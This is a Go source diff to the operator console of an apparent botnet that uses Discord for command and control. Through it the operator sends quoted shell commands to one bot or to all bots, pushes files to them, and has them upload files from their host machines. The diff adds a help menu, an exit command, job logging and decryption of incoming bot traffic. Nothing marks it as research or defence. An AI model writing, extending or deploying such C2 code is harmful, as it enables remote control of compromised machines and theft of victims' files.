@@ -3,7 +3,6 @@ package main
 import (
 	"bufio"
 	"fmt"
-	"net/http"
 	"os"
 	"os/signal"
 	"strings"
@@ -76,10 +75,7 @@ func main() {
 			var target string
 			var command string
 			n, err := fmt.Sscanf(input, "shell %s %q", &target, &command)
-			if err != nil {
-				fmt.Printf("%s\n> ", err.Error())
-				continue
-			} else if n != 2 {
+			if err != nil || n != 2 {
 				print("Incorrect \"shell\" arguments\n> ")
 				continue
 			}
@@ -89,57 +85,67 @@ func main() {
 			var target string
 			var filename string
 			n, err := fmt.Sscanf(input, "sendf %s %s", &target, &filename)
-			if err != nil {
-				fmt.Printf("%s\n> ", err.Error())
-				continue
-			} else if n != 2 {
+			if err != nil || n != 2 {
 				print("Incorrect \"sendf\" arguments\n> ")
 				continue
 			}
 			sendFile(target, filename, dg)
+			addJobToQueue(input)
 		case "reqf":
 			var target string
 			var filepath string
 			n, err := fmt.Sscanf(input, "reqf %s %s", &target, &filepath)
-			if err != nil {
-				fmt.Printf("%s\n> ", err.Error())
-				continue
-			} else if n != 2 {
+			if err != nil || n != 2 {
 				print("Incorrect \"reqf\" arguments\n> ")
 				continue
 			}
 			requestFile(target, filepath, dg)
+			addJobToQueue(input)
 		case "savef":
 			var filename string
 			n, err := fmt.Sscanf(input, "savef %s", &filename)
-			if err != nil {
-				fmt.Printf("%s\n> ", err.Error())
-				continue
-			} else if n != 1 {
+			if err != nil || n != 1 {
 				print("Incorrect \"savef\" argument\n> ")
 				continue
 			}
 			saveFile(filename)
+			addJobToQueue(input)
+		case "help":
+			fmt.Printf("shell <BotID|all> <\"command\">:\tRequests the BotID or all bots to execute the quoted command.\n" +
+				"sendf <BotID|all> <filepath>:\tUploads a file from the master and requests the targeted bot[s] to download that file.\n" +
+				"reqf <BotID|all> <filepath>:\tRequests the targeted bot[s] to upload the file at the given filepath.\n" +
+				"savef <filename>:\tSaves the specified file previously uplaoded by a bot.\n" +
+				"bots:\tLists the currently connected bots that were last seen at least 15 seconds ago.\n" +
+				"jobs:\tLists the last 5 executed jobs.\n" +
+				"files:\tLists the files uploaded by bots during the cuurrent session.\n" +
+				"exit:\tExits the program\n" +
+				"help:\tShows the available commands.\n")
+		case "exit":
+			closeDiscordSession(dg)
+			return
 		default:
-			fmt.Printf("%s is not a valid command.\n> ", input)
+			fmt.Printf("%s is not a valid command. Use \"help=\" to see commands.\n> ", input)
 			continue
 		}
 		print("> ")
 	}
 
-	fmt.Println("Closing")
+	closeDiscordSession(dg)
+}
+
+func closeDiscordSession(dg *discordgo.Session) {
+	fmt.Println("Closing Discord session.")
 	// Cleanly close down the Discord session.
 	e := dg.Close()
 	if e != nil {
 		println("There was an error closing the Discord session connection.")
 	}
-	fmt.Println("Closed")
 }
 
 func listJobs() {
-	println("Recently Executed Jobs:")
+	fmt.Printf("%s\nJobID\t\t\t\t\tTimestamp\t\tCommand\t\n%s\n", strings.Repeat("=", 80), strings.Repeat("=", 80))
 	for _, job := range jobs {
-		fmt.Printf("JobID: %s\tTimestamp: %s\tCommand: %s\n", job.id, job.time, job.cmd)
+		fmt.Printf("%s\t%s\t\t%s\n", job.id, job.time, job.cmd)
 	}
 }
 func listClients() {
@@ -169,6 +175,7 @@ func listFiles() {
 func executeShellCommand(target string, command string, dg *discordgo.Session) {
 	message := fmt.Sprintf("%s\n%s\n%q", target, "shell", command)
 	discord.SendMessage(dg, message)
+	fmt.Printf("Requested %s to execute %q\n", target, command)
 }
 
 func sendFile(target string, filename string, dg *discordgo.Session) {
@@ -179,6 +186,7 @@ func sendFile(target string, filename string, dg *discordgo.Session) {
 func requestFile(target string, filepath string, dg *discordgo.Session) {
 	message := fmt.Sprintf("%s\n%s\n%q", target, "reqf", filepath)
 	discord.SendMessage(dg, message)
+	fmt.Printf("Requested %s to upload %s\n", target, filepath)
 }
 
 func saveFile(filename string) {
@@ -202,7 +210,8 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		job      string
 		response string
 	)
-	n, err := fmt.Sscanf(m.Content, "%s\n%q\n%q", &botID, &job, &response)
+	decryptedContent := discord.Decrypt(m.Content)
+	n, err := fmt.Sscanf(decryptedContent, "%s\n%q\n%q", &botID, &job, &response)
 	if err != nil {
 		println(err.Error())
 		return
@@ -238,21 +247,4 @@ func addJobToQueue(command string) {
 	} else {
 		jobs = append(jobs, job)
 	}
-}
-
-func getFileContentType(out *os.File) (string, error) {
-
-	// Only the first 512 bytes are used to sniff the content type.
-	buffer := make([]byte, 512)
-
-	_, err := out.Read(buffer)
-	if err != nil {
-		return "", err
-	}
-
-	// Use the net/http package's handy DectectContentType function. Always returns a valid
-	// content-type by returning "application/octet-stream" if no others seemed to match.
-	contentType := http.DetectContentType(buffer)
-
-	return contentType, nil
 }
